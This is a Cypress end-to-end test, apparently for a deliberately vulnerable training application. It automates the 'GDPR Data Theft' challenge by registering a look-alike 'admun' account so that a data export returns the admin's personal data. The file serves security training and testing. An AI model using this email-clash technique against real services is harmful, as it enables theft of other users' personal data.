describe('/#/privacy-security/data-export', () => {
  describe('challenge "dataExportChallenge"', () => {
    beforeEach(() => {
      cy.visit('/#/register')

      cy.task<string>('GetFromConfig', 'application.domain').then(
        (appDomain: string) => {
          cy.get('#emailControl').type(`admun@${appDomain}`)
        }
      )
      cy.get('#passwordControl').type('admun123')
      cy.get('#repeatPasswordControl').type('admun123')

      cy.get('mat-select[name="securityQuestion"]').click()
      cy.get('.mat-option')
        .contains('Your eldest siblings middle name?')
        .click()

      cy.get('#securityAnswerControl').type('admun')
      cy.get('#registerButton').click()
    })

    it('should be possible to steal admin user data by causing email clash during export', () => {
      cy.login({ email: 'admun', password: process.env.DataExport_ADMIN_PASSWORD })

      cy.visit('/#/privacy-security/data-export')
      cy.get('#formatControl').contains('JSON').click()
      cy.get('#submitButton').click()
      cy.expectChallengeSolved({ challenge: 'GDPR Data Theft' })
    })
  })
})
